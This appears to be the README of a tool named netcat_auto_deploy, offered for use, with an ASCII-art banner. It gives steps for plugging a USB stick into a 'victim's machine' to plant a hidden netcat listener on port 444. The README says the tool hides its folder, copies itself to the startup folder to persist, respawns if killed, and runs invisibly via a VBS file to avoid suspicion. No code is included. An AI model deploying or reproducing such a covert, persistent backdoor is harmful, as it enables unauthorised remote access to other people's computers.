# netcat_auto_deploy


$$$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\   $$$$$$\  $$$$$$$\  
$$  __$$\ $$ ___$$\ $$  __$$\ $$$ __$$\ $$  __$$\ $$ ___$$\ $$  __$$\ 
$$ |  $$ |\_/   $$ |$$ /  \__|$$$$\ $$ |$$ |  $$ |\_/   $$ |$$ |  $$ |
$$ |  $$ |  $$$$$ / $$ |      $$\$$\$$ |$$ |  $$ |  $$$$$ / $$ |  $$ |
$$ |  $$ |  \___$$\ $$ |      $$ \$$$$ |$$ |  $$ |  \___$$\ $$ |  $$ |
$$ |  $$ |$$\   $$ |$$ |  $$\ $$ |\$$$ |$$ |  $$ |$$\   $$ |$$ |  $$ |
$$$$$$$  |\$$$$$$  |\$$$$$$  |\$$$$$$  /$$$$$$$  |\$$$$$$  |$$$$$$$  |
\_______/  \______/  \______/  \______/ \_______/  \______/ \_______/ 
                                                                      
                                                                      
                                                                   
a system that allows you to deploy a netcat shell invisibly from a usb stick.
1.copy the nc folder to your usb stick
2.insert usb in victim's machine
3.run "run.bat" located in "YourDrive:/nc/"
4.Done.
the script copy's itself to a folder and hides it....also it copy itself to the startup folder wich will launch the script again if the computer restarts.
the script also uses a loop so even if you close "nc.exe" in file manager it will automatically respawn
-THE DEFAULT LISTENNING PORT IS 444
-JUST TO MENTION THE SCRIPT RUNS INVISIBLY THROUGH A VBS FILE WICH WILL NOT MAKE ANYTHINK SUSPICIOUS.
enjoy.

